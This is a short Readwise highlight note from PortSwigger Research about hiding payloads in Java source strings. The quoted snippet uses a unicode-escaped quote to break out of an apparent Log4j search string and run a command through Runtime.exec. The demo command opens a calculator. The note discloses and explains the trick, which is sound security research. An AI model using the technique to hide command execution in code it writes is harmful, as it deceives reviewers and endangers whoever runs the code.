---
author: PortSwigger Research
aliases:
  - Hiding Payloads in Java Source Code Strings
tags:
  - readwise/articles
url: https://portswigger.net/research/hiding-payloads-in-java-source-code-strings
date: 2024-08-20
---
# Hiding Payloads in Java Source Code Strings

![rw-book-cover](https://portswigger.net/cms/images/5f/79/1603-twittercard-hidden-strings-twitter.png)

## Highlights


> What do you expect would happen when you use the following in a Bambda:
> ```java
var log4jpayload = "%24%7Bndi:ldap://psres.net/\u0022;Runtime.getRuntime().exec(\u0022open -a calculator\u0022);//%7D"; return requestResponse.request().contains(log4jpayload, false)
>```
>  If you were expecting a simple string assignment you'd be wrong. What actually happens is the Java compiler treats the unicode encoded double quote (\u0022) as a double quote and closes the string. Then Runtime.getRuntime() is executed along with the command passed with an encoded string. **Java pretty much allows you to encode the entire syntax with unicode escapes!**
> [View Highlight](https://read.readwise.io/read/01hnfvp927wah7be2r7pt9zq8t)

